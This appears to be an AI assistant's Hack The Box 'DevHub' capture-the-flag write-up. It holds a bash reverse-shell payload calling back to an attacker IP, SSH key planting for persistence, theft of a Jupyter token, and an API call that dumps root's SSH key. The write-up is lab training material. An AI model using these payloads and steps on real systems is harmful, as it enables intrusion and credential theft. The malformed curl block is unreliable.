Here is the complete, detailed writeup based on your notes and our previous troubleshooting steps. I have filled in the gaps, added the missing commands (especially for the root escalation phase that was cut off in your notes), and included a complete command tally at the end for easy revision.

---

# **HTB: DevHub - Complete Penetration Testing Writeup**

## **Phase 1: Reconnaissance & Initial Foothold (`mcp-dev`)**

The objective of this phase is to discover active services, identify the vulnerable web application, and establish our first reverse shell on the server.

### **1. Enumeration**

We begin by mapping the target's open ports and running services.

* **Command:** `nmap -sC -sV -p- <TARGET_IP>`
* **Results:** We discover SSH (port 22), HTTP (port 80), and an unknown service on port 6274. We also realize the web application requires domain routing.

We add the target IP to our local host file so our browser can resolve the domain.

* **Command:** `echo "<TARGET_IP> devhub.htb" | sudo tee -a /etc/hosts`

### **2. Exploiting the MCPJam API (Port 6274)**

Investigating the service on port 6274 reveals an MCP (Model Context Protocol) debug interface. We discover an endpoint (`/api/mcp/connect/`) that is vulnerable to unauthenticated remote code execution (RCE) because it blindly executes binaries registered to it.

We set up a Netcat listener on our Kali machine:

* **Command:** `nc -lvnp 4444`

We then craft a malicious JSON/POST request (using Python, Burp Suite, or cURL) containing a reverse shell payload:

* **Payload injected:** `bash -c 'bash -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1'`

This triggers the payload, and our Netcat listener catches the connection, granting us a shell as the low-privileged user **`mcp-dev`**.

---

## **Phase 2: Lateral Movement (`analyst`)**

As `mcp-dev`, we lack the permissions to read the user flag. We enumerate local network connections (`ss -tuln`) and discover a Jupyter Notebook instance running on `127.0.0.1:8888`. To access it, we must securely tunnel into the machine.

### **3. Planting the SSH Key**

Since we do not have the password for `mcp-dev`, we must create our own SSH key pair on Kali and plant the public key on the DevHub server to allow seamless login.

* **On Kali (Generate Key):** `ssh-keygen -t rsa -f devhub_key`
`cat devhub_key.pub` *(Copy this output)*
* **On DevHub (Plant Key):**
We create the `.ssh` directory and overwrite the `authorized_keys` file with our copied key, ensuring strict permissions are set so SSH doesn't reject it.
```bash
mkdir -p /home/mcp-dev/.ssh
echo "ssh-rsa AAAAB3NzaC1...[YOUR_KEY]...==" > /home/mcp-dev/.ssh/authorized_keys
chmod 700 /home/mcp-dev/.ssh
chmod 600 /home/mcp-dev/.ssh/authorized_keys

```



### **4. Establishing the SSH Tunnel**

Back on our Kali machine, we use the private key to log in and simultaneously forward DevHub's internal port 8888 to our local port 8888.

* **Command:** `ssh -i devhub_key -L 8888:127.0.0.1:8888 mcp-dev@<TARGET_IP>`

### **5. Hijacking Jupyter & Capturing the User Flag**

We navigate to `http://127.0.0.1:8888` on our Kali browser, but are met with a token login screen.

To find the token, we go back to our `mcp-dev` terminal and search running processes for the Jupyter startup command:

* **Command:** `ps auxww | grep jupyter`

We extract the token (e.g., `--ServerApp.token=c8de56fa...`), paste it into the browser, and gain access to the `analyst` user's workspace.

Inside a new Python notebook cell, we execute system commands to read the user flag:

* **Command (Python):**

In [ ]:
import os
os.system('cat /home/analyst/user.txt')

---

## **Phase 3: Privilege Escalation (`root`)**

Now operating with `analyst` privileges (via the Jupyter interface), our goal is to achieve total system compromise.

### **6. Enumerating Internal Developer Scripts**

We search the entire filesystem for custom developer scripts, specifically looking for `server.py` as hinted by our enumeration.

* **Command:** `find / -type f -name "server.py" 2>/dev/null`

We discover the file at `/opt/opsmcp/server.py`. Using our Jupyter environment, we read the source code:

* **Command (Python):**

In [ ]:
with open('/opt/opsmcp/server.py', 'r') as file:
    print(file.read())

### **7. Exploiting the Internal API**

Reading the source code reveals a Flask web service running locally on **port 5000**. It has a hidden endpoint (`ops._admin_dump`) that dumps the root SSH key. It requires an `X-API-Key` header (`opsmcp_secret_key_4f5a6b7c8d9e0f1a`) and specific JSON parameters (`target: ssh_keys`, `confirm: true`).

From the Jupyter terminal (or a new reverse shell as `analyst`), we execute the API call:

* **Command:** ```bash
curl -X POST http://127.0.0.1:5000/tools/call
-H "Content-Type: application/json"
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
-d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```


```



### **8. Formatting the Key and Root Login**

The API dumps the root SSH key to the terminal. However, the JSON formatting turns it into a single string with literal `\n` characters.

We copy the string to our Kali machine, save it as `root_key`, and use `sed` to replace the `\n` text with actual line breaks:

* **Command:** `sed -i 's/\\n/\n/g' root_key`

Finally, we lock down the permissions and log in as root to grab the final flag:

* **Command:** `chmod 600 root_key`
* **Command:** `ssh -i root_key root@<TARGET_IP>`
* **Command:** `cat /root/root.txt`

---

## **Summary: Complete Command Tally**

Here is the exact list of the 15 core terminal commands utilized to conquer this machine from start to finish:

| # | Phase | Kali/Local Command | Target/Remote Command |
| --- | --- | --- | --- |
| 1 | Recon | `nmap -sC -sV -p- <TARGET_IP>` |  |
| 2 | Recon | `echo "<IP> devhub.htb" | sudo tee -a /etc/hosts` |  |
| 3 | Foothold | `nc -lvnp 4444` |  |
| 4 | Lateral Pivot | `ssh-keygen -t rsa -f devhub_key` |  |
| 5 | Lateral Pivot | `cat devhub_key.pub` |  |
| 6 | Lateral Pivot |  | `mkdir -p /home/mcp-dev/.ssh` |
| 7 | Lateral Pivot |  | `echo "[KEY]" > /home/mcp-dev/.ssh/authorized_keys` |
| 8 | Lateral Pivot |  | `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys` |
| 9 | SSH Tunnel | `ssh -i devhub_key -L 8888:127.0.0.1:8888 mcp-dev@<IP>` |  |
| 10 | Enum (Jupyter) |  | `ps auxww | grep jupyter` |
| 11 | Enum (Root) |  | `find / -type f -name "server.py" 2>/dev/null` |
| 12 | PrivEsc |  | `curl -X POST http://127.0.0.1:5000/tools/call -H "Content-Type: application/json" -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'` |
| 13 | Key Formatting | `sed -i 's/\\n/\n/g' root_key` |  |
| 14 | Key Security | `chmod 600 root_key` |  |
| 15 | Root Login | `ssh -i root_key root@<TARGET_IP>` | `cat /root/root.txt` |